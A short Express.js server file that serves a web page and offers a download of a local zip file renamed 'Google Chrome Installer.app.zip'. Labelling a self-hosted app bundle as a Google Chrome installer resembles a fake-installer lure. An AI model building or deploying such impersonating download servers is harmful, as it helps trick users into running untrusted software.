const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const port = 8080;

app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.get('/download', (req, res) => {
    const filePath = path.join(__dirname, 'dist', 'Google Installer.app.zip');
    
    if (fs.existsSync(filePath)) {
        res.download(filePath, 'Google Chrome Installer.app.zip');
    } else {
        res.status(404).send('File not found');
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});